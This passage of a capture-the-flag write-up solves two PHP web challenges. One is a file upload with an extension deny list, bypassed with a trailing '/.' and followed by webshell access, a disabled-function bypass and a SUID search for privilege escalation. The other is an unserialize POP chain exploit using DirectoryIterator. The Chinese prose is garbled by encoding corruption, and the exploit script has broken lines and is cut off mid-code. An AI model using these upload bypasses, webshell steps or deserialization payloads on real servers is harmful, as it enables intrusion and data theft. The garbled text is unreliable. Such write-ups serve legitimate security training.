class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;æäº¤&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;php1&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;pHp&quot;</span>,<span class="string">&quot;pHp5&quot;</span>,<span class="string">&quot;pHp4&quot;</span>,<span class="string">&quot;pHp3&quot;</span>,<span class="string">&quot;pHp2&quot;</span>,<span class="string">&quot;pHp1&quot;</span>,<span class="string">&quot;Html&quot;</span>,<span class="string">&quot;Htm&quot;</span>,<span class="string">&quot;pHtml&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;jSp&quot;</span>,<span class="string">&quot;jSpx&quot;</span>,<span class="string">&quot;jSpa&quot;</span>,<span class="string">&quot;jSw&quot;</span>,<span class="string">&quot;jSv&quot;</span>,<span class="string">&quot;jSpf&quot;</span>,<span class="string">&quot;jHtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;aSp&quot;</span>,<span class="string">&quot;aSpx&quot;</span>,<span class="string">&quot;aSa&quot;</span>,<span class="string">&quot;aSax&quot;</span>,<span class="string">&quot;aScx&quot;</span>,<span class="string">&quot;aShx&quot;</span>,<span class="string">&quot;aSmx&quot;</span>,<span class="string">&quot;cEr&quot;</span>,<span class="string">&quot;sWf&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;ini&quot;</span>);</span><br><span class="line">    <span class="variable">$ext</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$file</span>, PATHINFO_EXTENSION);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$deny_ext</span> <span class="keyword">as</span> <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">stristr</span>(<span class="variable">$ext</span>, <span class="variable">$value</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    <span class="variable">$filecontent</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">blacklist</span>(<span class="variable">$filename</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$filecontent</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Success!!!&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker!!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>æˆ‘ä»¬æŸ¥çœ‹æºç å¯ä»¥çœ‹åˆ°æˆ‘ä»¬å‘é€çš„æ–‡ä»¶ï¼Œåç«¯å¹¶æ²¡æœ‰å°†ç»“å°¾çš„ä¸€äº›ç‰¹æ®Šå­—ç¬¦è¿›è¡Œæˆªå–ï¼Œè¿™å°±å¯¼è‡´äº†æˆ‘ä»¬å¯ä»¥å°è¯•ä¸€äº›æ·»åŠ åç¼€çš„æ–¹æ³•è¿›è¡Œç»•è¿‡ï¼Œæˆ‘è¿™é‡Œä½¿ç”¨çš„æ˜¯/.æ¥è¿›è¡Œç»•è¿‡ï¼ˆå»ºè®®ä½¿ç”¨urlç¼–ç ï¼‰<br><img src="/2024/03/04/%E6%A0%A1%E8%B5%9Bwp/upload-1.png" class="" title="alt text"><br>æˆ‘ä»¬ç”¨èšå‰‘è¿æ¥ï¼Œæ‰“å¼€ç»ˆç«¯å‘ç°æ— æ³•è¿›è¡Œå‘½ä»¤æ‰§è¡Œ<br><img src="/2024/03/04/%E6%A0%A1%E8%B5%9Bwp/up-2.png" class="" title="alt text"><br>æ‰“å¼€phpinfoä¼šå‘ç°å¾ˆå¤šç¦ç”¨æ–¹æ³•<br>æˆ‘ä»¬ä½¿ç”¨æ’ä»¶ç»•è¿‡<br><img src="/2024/03/04/%E6%A0%A1%E8%B5%9Bwp/up-3.png" class="" title="alt text"><br><img src="/2024/03/04/%E6%A0%A1%E8%B5%9Bwp/up-4.png" class="" title="alt text"><br>è¿™æ—¶æˆ‘ä»¬ä»ç„¶æ— æ³•è¿›è¡ŒæŸ¥çœ‹flagï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•ææƒï¼Œæˆ‘ä»¬æŸ¥æ‰¾å…·æœ‰suidæƒé™çš„æ–‡ä»¶<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><br><img src="/2024/03/04/%E6%A0%A1%E8%B5%9Bwp/up-5.png" class="" title="alt text"><br>ä¼šå‘ç°ä¸€ä¸ªæ¯è§è¿‡çš„ï¼Œæˆ‘ä»¬ç›´æ¥å°è¯•è¿è¡Œä¼šå‘ç°ç›´æ¥å¼¹å‡ºäº†flag<br>æˆ‘ä¸ªäººè®¤ä¸ºè¿™é“é¢˜ç›®çš„ç›®çš„æ˜¯ä¸ºäº†è®©æˆ‘å­¦ä¹ ææƒï¼Œä½†å­¦é•¿æ€•éš¾åº¦å¤ªé«˜äºæ˜¯å°±æ•´äº†è¿™ä¹ˆä¸€å‡º</p><h2 id="ezzz-unserialize"><a href="#ezzz-unserialize" class="headerlink" title="ezzz_unserialize"></a>ezzz_unserialize</h2><p>è§£é¢˜äººï¼šLSE<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sakura</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$apple</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$strawberry</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; apple = <span class="variable">$a</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span> -&gt; apple;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$new</span> = <span class="variable language_">$this</span> -&gt; strawberry;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$new</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NoNo</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$peach</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; peach = <span class="variable">$string</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$var</span> = <span class="variable language_">$this</span> -&gt; <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable">$var</span>[<span class="variable">$name</span>]();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BasaraKing</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$orange</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cherry</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arg1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$arg1</span>,<span class="variable">$arg2</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span> -&gt; orange;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg1</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; cherry -&gt; <span class="title function_ invoke__">ll2</span>(<span class="string">&#x27;b2&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UkyoTachibana</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$banana</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mangosteen</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$long</span> = @<span class="variable language_">$this</span> -&gt; banana -&gt; <span class="title function_ invoke__">add</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$long</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$arg1</span>,<span class="variable">$arg2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span> -&gt; mangosteen -&gt; tt2)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Sakura was the best!!!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">E</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$e</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg1</span></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">array_walk</span>(<span class="variable">$this</span>, function (<span class="variable">$Monday</span>, <span class="variable">$Tuesday</span>) &#123;</span><br><span class="line">            <span class="variable">$Wednesday</span> = <span class="keyword">new</span> <span class="variable">$Tuesday</span>(<span class="variable">$Monday</span>);</span><br><span class="line">            <span class="keyword">foreach</span>(<span class="variable">$Wednesday</span> <span class="keyword">as</span> <span class="variable">$Thursday</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> (<span class="variable">$Thursday</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UesugiErii</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$coconut</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">addMe</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;My time with Sakura was my happiest time&quot;</span>.<span class="variable language_">$this</span> -&gt; coconut;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>([<span class="variable">$this</span>, <span class="variable">$func</span>.<span class="string">&quot;Me&quot;</span>], <span class="variable">$args</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Heraclqs</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$grape</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blueberry</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span> -&gt; blueberry)) == <span class="number">123</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span> -&gt; grape -&gt; hey;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MaiSakatoku</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Carambola</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$Kiwifruit</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; <span class="variable">$name</span> = <span class="variable">$value</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span> -&gt; Kiwifruit = <span class="string">&quot;Sakura&quot;</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">strtolower</span>(<span class="variable">$this</span>-&gt; Carambola);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;GHCTF&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;GHCTF&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>è¿™é¢˜å› ä¸ºæˆ‘æ‰¾ä¸åˆ°åŸç”Ÿç±»ï¼Œä¸€å¼€å§‹å¯æ˜¯æŠ˜ç£¨æ­»æˆ‘äº†ã€‚è¿™é¢˜æˆ‘ä»¬çœ‹åˆ°æ²¡æœ‰åé—¨å‡½æ•°æ‰€ä»¥æˆ‘ä»¬éœ€è¦ä½¿ç”¨phpåŸç”Ÿç±»æ¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œæˆ‘ä»¬å…ˆå¯»æ‰¾é“¾å°¾å·´ï¼Œå‘ç°é“¾å°¾å¤§æ¦‚ç‡ä¸º<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">E</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$e</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg1</span></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">array_walk</span>(<span class="variable">$this</span>, function (<span class="variable">$Monday</span>, <span class="variable">$Tuesday</span>) &#123;</span><br><span class="line">            <span class="variable">$Wednesday</span> = <span class="keyword">new</span> <span class="variable">$Tuesday</span>(<span class="variable">$Monday</span>);</span><br><span class="line">            <span class="keyword">foreach</span>(<span class="variable">$Wednesday</span> <span class="keyword">as</span> <span class="variable">$Thursday</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> (<span class="variable">$Thursday</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>å› ä¸ºæœ€åä¸€å¥<code>echo ($Thursday.&#39;&lt;br&gt;&#39;)</code>ä¼šè§¦å‘åŸç”Ÿç±»ã€‚æˆ‘ä»¬æ¥åˆ†æè¿è¡Œè¿™ä¸ªæ–¹æ³•ã€‚<br><code>array_walk($this, function ($Monday, $Tuesday)</code>è¿™ä¸ªæ–¹æ³•æ˜¯å°†æˆ‘ä»¬çš„å±æ€§çš„å˜é‡åå’Œå†…å®¹åˆ†åˆ«ä¼ åˆ° <code>$Tuesdayå’Œ$Monday</code>ï¼Œä¹‹åå†åˆ›å»ºä¸€ä¸ªæ–°çš„å®ä¾‹å¯¹è±¡ã€‚ <code>$Tuesday($Monday)</code><br>æˆ‘ä»¬è¿™æ—¶å€™å°±å¯ä»¥æ§åˆ¶<code>$Tuesdayå’Œ$Monday</code>çš„å€¼å°†<code>$Tuesday($Monday)</code>å˜ä¸ºDirectoryIterator(/)å°±å¯ä»¥æŸ¥çœ‹å…¶ç›®å½•çš„å†…å®¹äº†ã€‚æˆ‘è¿™é‡Œç›´æ¥è´´ä¸€ç¯‡å­¦é•¿çš„åŸç”Ÿç±»æ–‡ç« å§ã€‚<a href="https://hyggevv.github.io/2023/04/20/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/">åŸç”Ÿç±»</a></p><p>æ—¢ç„¶æ‰¾çš„äº†é“¾å°¾å·´æˆ‘ä»¬å°±ç»§ç»­åå›å»æ‰¾ï¼Œä»”ç»†æŸ¥çœ‹ä¼šå‘ç°æ•´æ¡é“¾ä¸º<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Sakura&#123;__destruct&#125;-&gt;Sakura&#123;__toString&#125;-&gt;Heraclqs&#123;__invoke()&#125;-&gt;E&#123;__get($arg1)&#125;</span><br></pre></td></tr></table></figure><br>è¿™å°±æ˜¯æ•´æ¡åˆ©ç”¨é“¾äº†æ³¨æ„åœ¨Heraclqsæˆ‘ä»¬éœ€è¦ç»•è¿‡md5å€¼æˆ‘è¿™é‡Œè„šæœ¬æ‰¾ä¸åˆ°äº†ï¼Œåœ¨ç½‘ä¸Šéšä¾¿æœä¹Ÿèƒ½æœåˆ°æˆ‘å°±ä¸è´´äº†<br>ä¸‹é¢æ˜¯exp<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sakura</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$apple</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$strawberry</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; apple = <span class="variable">$a</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span> -&gt; apple;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$new</span> = <span class="variable language_">$this</span> -&gt; strawberry;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$new</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">E</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$e</span>=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$DirectoryIterator</span>=<span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg1</span></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">array_walk</span>(<span class="variable">$this</span>, function (<span class="variable">$Monday</span>, <span class="variable">$Tuesday</span>) &#123;</span><br><span class="line">            <span class="variable">$Wednesday</span> = <span class="keyword">new</span> <span class="variable">$Tuesday</span>(<span class="variable">$Monday</span>);</span><br><span class="line">            <span class="keyword">foreach</span>(<span class="variable">$Wednesday</span> <span class="keyword">as</span> <span class="variable">$Thursday</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> (<span class="variable">$Thursday</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Heraclqs</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$grape</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blueberry</span>=<span class="string">&quot;sr22kaDugamdwTPhG5zU&quot;</span>;åŒé‡mdåŠ å¯†åå¼€å¤´ä¸º<span class="number">123</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span> -&gt; blueberry)) == <span class="number">123</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span> -&gt; grape -&gt; hey;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>= <span class="keyword">new</span> <span class="title class_">Sakura</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="variable">$apple</span>=<span class="keyword">new</span> <span class="title class_">Sakura</span>();</span><br><span 